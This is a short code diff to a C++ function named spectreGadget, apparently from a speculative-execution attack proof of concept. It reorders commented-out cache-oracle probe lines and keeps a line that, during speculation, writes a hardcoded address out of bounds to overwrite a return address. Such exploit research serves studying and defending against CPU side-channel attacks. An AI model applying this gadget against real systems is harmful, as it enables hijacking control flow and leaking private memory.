@@ -242,16 +242,15 @@ void spectreGadget() {
   for (int i = 0; i < 100; i++) {}
 
   if (vars[0] == 0) {
-    // Test to make sure that CPU speculates.
-    // const std::array<BigByte, 256> &oracle = *oracle_ptr;
-    // ForceRead(oracle.data() +
-    //   static_cast<unsigned char>(private_data[current_offset]));
-
     // The offset to ptr is 0 during training such
     // that it doesn't write OOB, but is 8 during
     // speculation s.t. it overwrites the ret addr.
     *(volatile uint64_t *)(ptr + vars[SIZE - 1]) = 0x0000555555555701;
-    return;
+
+    // Test to make sure that CPU speculates.
+    // const std::array<BigByte, 256> &oracle = *oracle_ptr;
+    // ForceRead(oracle.data() +
+    //   static_cast<unsigned char>(private_data[current_offset]));
   }
 }
 
